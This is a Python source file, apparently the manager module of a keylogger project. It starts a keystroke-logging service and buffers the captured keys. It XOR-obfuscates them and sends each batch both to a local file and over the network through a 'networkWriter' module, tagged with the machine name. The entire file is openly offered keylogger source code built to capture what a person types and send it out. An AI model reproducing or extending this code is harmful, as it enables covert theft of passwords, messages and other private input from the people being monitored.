import datetime
import time
import json
import os
from KeyloggerService import service
from Encryption_file import encryptor
from FileWriter import file_writer
from networkWriter import networkWriter

class KeyLoggerManager:
    def __init__(self):
        self.buffer = []
        self.to_encrypt = []
        self.config = self.load_config()

    def load_config(self):
        try:
            with open("config.json", "r") as f:
                return json.load(f)
        except FileNotFoundError:
            return {
                "machine_name": "unknown",
                "machine_ip": "127.0.0.1"
            }

    def manager(self):
        service.start_logging()
        end = False
        try:
            while not end:
                new_keys = service.get_logged_keys()
                if new_keys:
                    self.buffer.extend(new_keys)


                    if "<ESC>" in new_keys:
                        end = True

                    if len(self.buffer) > 20 or end:
                        timestamp = str(datetime.datetime.now())

                        encrypted_keys = []
                        for char in self.buffer:
                            encrypted_keys.append(encryptor.ascii_xor(char))

                        content = {timestamp: encrypted_keys}
                        machine_name = self.config.get("machine_name", "unknown")
                        file_writer.send_data(content, machine_name)
                        networkWriter.send_data(content, machine_name)

                        self.buffer = []

                time.sleep(5)
        except KeyboardInterrupt:
            pass
        finally:
            service.stop_logging()


if __name__ == "__main__":
    print("keylogger start to run, for stop press ESC")
    manager = KeyLoggerManager()
    manager.manager()

